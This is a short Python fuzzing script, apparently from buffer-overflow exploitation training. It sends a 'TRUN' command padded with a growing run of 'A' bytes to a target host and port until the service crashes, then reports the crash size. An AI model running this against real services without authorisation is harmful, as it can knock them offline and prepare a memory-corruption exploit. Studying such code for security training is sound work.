#!/usr/bin/python3
import sys, socket
from time import sleep

if len(sys.argv) != 3:
    print('Usage: "' + sys.argv[0] + ' 1.2.3.4 21"')
    sys.exit()

buffer = b"A" * 100

target = sys.argv[1]
targetport = int(sys.argv[2])

while True:
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((target, targetport))
        print("Sending buffer size: " + str(len(buffer)))
        s.send((b'TRUN /.:/' + buffer))
        s.close()
        sleep(1)
        buffer = buffer + b"A"*100

    except:
        print("Fuzzing crashed at {0} bytes".format(len(buffer)))
        sys.exit()
